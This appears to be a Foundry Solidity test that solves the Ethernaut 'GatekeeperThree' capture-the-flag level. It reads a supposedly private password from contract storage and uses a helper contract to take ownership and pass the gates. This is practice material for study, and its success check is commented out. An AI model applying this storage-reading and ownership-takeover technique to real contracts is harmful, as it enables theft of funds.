// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/GateKeeperThree/GateKeeperThreeFactory.sol";
import "../src/levels/GateKeeperThree/GateOwner.sol";
import "../src/Ethernaut.sol";

contract GateKeeperThreeTest is DSTest {
    Ethernaut ethernaut;
    GatekeeperThreeFactory gateKeeperThreeFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        gateKeeperThreeFactory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(gateKeeperThreeFactory);
    }

    function testIsGateKeeperThreeCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(
            gateKeeperThreeFactory
        );

        GatekeeperThree gateKeeperThree = GatekeeperThree(payable(instance));
        gateKeeperThree.createTrick();

        bytes32 password = vm.load(
            address(gateKeeperThree.trick()),
            bytes32(uint256(2))
        );

        gateKeeperThree.getAllowance(uint256(password));

        GateOwner gateOwner = new GateOwner(instance);

        vm.deal(instance, 0.002 ether);
        gateOwner.becomeOwner();
        gateOwner.enter();

        // assertTrue(ethernaut.submitLevelInstance(payable(instance)));
        // Can't check for success.

        vm.stopPrank();
    }
}
